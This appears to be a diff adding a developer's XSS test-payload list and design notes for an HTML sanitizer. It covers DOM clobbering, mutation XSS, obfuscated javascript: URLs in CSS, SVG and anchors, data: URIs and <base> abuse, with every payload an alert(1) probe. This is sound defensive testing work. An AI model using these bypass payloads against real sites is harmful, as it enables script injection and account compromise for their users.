@@ -1,0 +1,229 @@
+
+
+# DOM Clobbering Against Your Own Code
+<form id="attributes"></form>
+<input name="parentNode">
+<div id="__proto__">
+
+# Mutation-Based Bypass
+<div id="x"><math href="javascript:alert(1)">CLICK</math></div>
+<script>
+x.innerHTML = x.innerHTML
+</script>
+
+# broken parsing
+<div style="color:red; background:url(javascript:alert(1))">
+
+# nested injection
+<div style="background:url(url(javascript:alert(1)))">
+
+# comment splitting
+<div style="background:url(jav/**/ascript:alert(1))">
+
+# deep escape attack
+<div style="background:url(\00006a\000061vascript:alert(1))">
+
+# cusutom properties
+<div style="--x:url(javascript:alert(1));background:var(--x)">
+
+# namespace shadowing
+<svg>
+  <g xmlns="http://www.w3.org/1999/xhtml">
+    <script>alert(1)</script>
+  </g>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject>
+    <body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)">
+  </foreignObject>
+</svg>
+
+<a href="http://example.com#javascript:alert(1)">
+<a href="http://example.com\@javascript:alert(1)">
+<a href="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">
+<a href="javascript&#x00003A;alert(1)">
+<a href="&#0000106&#0000097vascript:alert(1)">
+<a href="&#x20;javascript:alert(1)">
+<a href=" \t\n javascript:alert(1)">
+
+
+# 46–50: DOM Clobbering & Structural Abuse
+<form name="getElementById">
+<input name="attributes">
+<div id="__proto__">
+<img name="innerHTML">
+<meta http-equiv="refresh" content="0;javascript:alert(1)">
+
+# Template and iner content<template><img src=x onerror=alert(1)></template>
+<template><svg onload=alert(1)></svg></template>
+<noscript><img src=x onerror=alert(1)></noscript>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<form><button formaction="javascript:alert(1)">X</button></form>
+
+# SVG
+<svg><style>*{background:url(javascript:alert(1))}</style></svg>
+<svg><feImage xlink:href="javascript:alert(1)"/></svg>
+<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>
+<svg><animate href="javascript:alert(1)" attributeName="href"></svg>
+<svg><use href="javascript:alert(1)"></use></svg>
+<svg><image href="javascript:alert(1)"></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg><script>alert(1)</script></svg>
+<svg onload="alert(1)"></svg>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject>
+    <body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)">
+    </body>
+  </foreignObject>
+</svg>
+<svg>
+  <g xmlns="http://www.w3.org/1999/xhtml">
+    <script>alert(1)</script>
+  </g>
+</svg>
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">
+<svg>
+  <use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>#x"></use>
+</svg>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink">
+  <a xlink:href="javascript:alert(1)">CLICK</a>
+</svg>
+<svg>
+  <g xmlns="http://www.w3.org/1999/xhtml">
+    <img src=x onerror=alert(1)>
+  </g>
+</svg>
+
+<svg onload="alert(1)"></svg> // YES
+<svg><script>alert(1)</script></svg> // YES
+
+
+# CSS url() Obfuscation
+<style>@import url(javascript:alert(1));</style>
+<style>div { background: url(javascript:alert(1)) }</style>
+<div style="--x:url(javascript:alert(1));background:var(--x)">
+<div style="background:url(javascript&#58;alert(1))">
+<div style="background:url(java/**/script:alert(1))">
+<div style="background:url(\6a avascript:alert(1))">
+<div style="background:url(j\61vascript:alert(1))">
+<div style="background:url( javascript:alert(1) )">
+<div style="background:url(javascript:alert(1))">
+
+
+# Control Characters & Unicode
+<a href="javascript:%61lert(1)">
+<a href="Ｊavascript:alert(1)">
+<a href="java\uFF53cript:alert(1)">
+<a href="javаscript:alert(1)">
+<a href="jav\u2029ascript:alert(1)">
+<a href="jav\u2028ascript:alert(1)">
+<a href="jav%00ascript:alert(1)">
+<a href="jav&#x0000;ascript:alert(1)">
+<a href="jav&#0;ascript:alert(1)">
+<a href="jav\u0000ascript:alert(1)">
+
+# Scheme Confusion & URI Edge Cases
+<a href="blob:javascript:alert(1)">
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<a href="data:text/html,<script>alert(1)</script>">
+<a href="javascript:alert(1)//example.com">
+<a href="javascript&#58;alert(1)">
+<a href="&#106;&#97;vascript:alert(1)">
+<a href="java&#x09;script:alert(1)">
+<a href="java&#x0A;script:alert(1)">
+<a href="JaVaScRiPt:alert(1)">
+<a href="javascript:alert(1)">
+
+
+\6a\61\76\61script: -> javascript
+\00006a avascript: -x javascript
+
+# Raw attribute string
+Extract attribute value
+Decode HTML entities
+Trim whitespace
+Remove control character
+Then parse URL
+Then inspect scheme
+-> If scheme is empty or unrecognized → reject.
+
+If scheme exists and not in allowed → reject
+If scheme empty → treat as relative → allow only if relative allowed
+Never treat invalid parse as safe
+
+Allowed:
+data:image/png
+data:image/jpeg
+data:image/gif
+
+Blocked:
+data:text/html
+data:image/svg+xml
+data:application/xml
+# example
+data:image/svg+xml,<svg onload=alert(1)>
+
+URL-bearing
+You must ensure that every attribute that accepts URL is validated.
+
+Not just:
+href
+src
+
+But also:
+xlink:href
+formaction
+poster
+action
+filter
+clip-path
+mask
+style url()
+use href (SVG)
+
+# <base>
+If <base href> is allowed, then:
+<base href="javascript:alert(1)//">
+<a href="/x">
+Now relative URLs resolve to javascript scheme.
+If you allow <base>, you must sanitize it or remove it.
+Your tests do not show base handling.
+
+validation runs after parsing and uses parsed scheme -> good
+
+1️⃣ CSS custom property indirection
+2️⃣ data:image/svg+xml
+3️⃣ Unchecked SVG URL-bearing attribute
+4️⃣ Scheme normalization edge-case
+5️⃣ Missing idempotency check
+
+
+# url() in Unexpected Properties
+
+Even if you restrict common properties, many properties allow url():
+cursor
+list-style
+content
+filter
+mask
+background
+border-image
+If your sanitizer is not property-aware, you must treat any url() as suspect.
+
+Even if you block url(javascript:), @import can load remote CSS.
+If you allow <style> at all, you must strip @import.
+
+CSS comments are valid anywhere: url(jav/**/ascript:alert(1))
+If you do not remove comments before scheme checking → bypass.
+
+Attackers love this: background:url(url(javascript:alert(1)))
+If you scan for url( once and remove it,nested version may survive.
+You must tokenize parentheses depth correctly
+
+<svg>
+  <g xmlns="http://www.w3.org/1999/xhtml">
+    <img src=x onerror=alert(1)>
+  </g>
+</svg>
